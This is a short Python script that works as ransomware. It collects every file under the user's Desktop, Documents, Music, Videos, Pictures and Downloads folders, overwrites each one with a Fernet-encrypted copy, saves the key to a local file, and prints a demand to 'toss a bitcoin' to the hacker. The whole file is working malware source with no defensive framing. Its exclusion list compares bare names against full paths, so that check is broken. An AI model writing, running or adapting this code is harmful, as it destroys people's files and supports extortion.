import os
from cryptography.fernet import Fernet

# Define the list of directories to be traversed
directories = ["Desktop", "Documents", "Music", "Videos", "Pictures", "Downloads"]

# Initialize an empty list to store all the files in the specified directories
files = []

# Traverse each directory and subdirectory to get all files
for directory in directories:
    for root, _, filenames in os.walk(os.path.expanduser(f"~/{directory}")):
        for filename in filenames:
            files.append(os.path.join(root, filename))

# Generate the encryption key and save it in a file
key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)
    
# these files should not be encrypted
forbidden_files = ["README.md", "decrypt.py", "dryrun.py", "encrypt.py", "old_decrypt.py", "voldemort.py", "thekey.key"]

# Encrypt each file with the generated key
for file in files:
    if file in forbidden_files:
        continue
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("Toss a bitcoin to your hacker O' owner of this pc!")
